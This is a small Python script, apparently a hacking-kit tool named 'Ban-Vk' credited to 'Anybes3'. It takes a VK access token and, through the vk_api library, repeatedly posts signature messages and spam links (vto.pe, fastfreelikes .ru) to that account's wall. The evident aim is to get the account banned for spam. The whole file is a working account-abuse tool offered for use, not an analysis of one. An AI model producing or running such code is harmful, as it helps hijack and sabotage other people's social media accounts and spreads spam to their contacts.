from colorama import Fore, Back, Style 
import time
import requests
import vk_api
import os
def vkban():
    os.system("clear")
    intro = '''


╔══╗╔══╦╗ ╔╗ ╔╗╔╦╗╔══╗
║╔╗║║╔╗║╚═╝║ ║║║║║║╔═╝
║╚╝╚╣╚╝║╔╗ ║ ║║║║╚╝║
║╔═╗║╔╗║║╚╗║ ║╚╝║╔╗║
║╚═╝║║║║║ ║║ ╚╗╔╣║║╚═╗
╚═══╩╝╚╩╝ ╚╝  ╚╝╚╝╚══╝

Author (tg) - Anybes3
'''
    print(Fore.RED  + intro)
    print(Fore.CYAN + """                                  
[1] Ban-Vk                                               
[2] EXIT                                 


    """)
    a = input("[1 or 2?] -> ")
    if a == "1":
        try:
            toke = input("[Access token] -> ") 
            token = vk_api.VkApi(token = toke) 
            vk = token.get_api()
            vk.wall.post(message='Fatality by Anybes3 ')  
            vk.wall.post(message='vto.pe')
            vk.wall.post(message='СОВА НИКОГДА НЕ СПИТ')
            vk.wall.post(message='vto.pe')
            for var in range(5):
                time.sleep(3)
                vk.wall.post(message='Fatality by Anybes3 ')  
                vk.wall.post(message='fastfreelikes .ru ')
                vk.wall.post(message='СОВА НИКОГДА НЕ СПИТ')           
            print(Back.BLACK + Fore.WHITE)
            os.system("clear")
            vkban()
        except Exception as er:
            print('Non-working token')
            vkban()
    if a == "2":
        os.system("exit")
    else:
        vkban()
vkban()
